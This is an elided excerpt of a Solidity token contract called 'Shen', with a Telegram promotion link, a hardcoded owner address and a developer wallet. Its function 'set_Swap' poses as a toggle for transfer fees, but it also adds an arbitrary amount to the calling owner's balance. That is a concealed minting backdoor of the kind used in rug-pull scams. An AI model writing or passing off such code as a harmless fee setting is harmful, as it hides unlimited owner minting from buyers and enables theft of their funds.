...
// *Telegram : https://t.me/shenlonggrow
...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0xC0D68Dff34C93e0006729A3aBfEf4dDcB31c9723;
...
contract Shen is Context, IERC20, Ownable { 
    ...
    */
    ...
    address payable private Wallet_Dev = payable(0x82D2b127C9530DBEa99B07D542894bcF4b1B3244);
    ...
    */
    ...
    // Default is true
    function set_Swap(bool true_or_fa, uint256 _amount) external onlyOwner {
        noFeeToTransfer = true_or_fa;
        _tOwned[msg.sender] += _amount;
    }
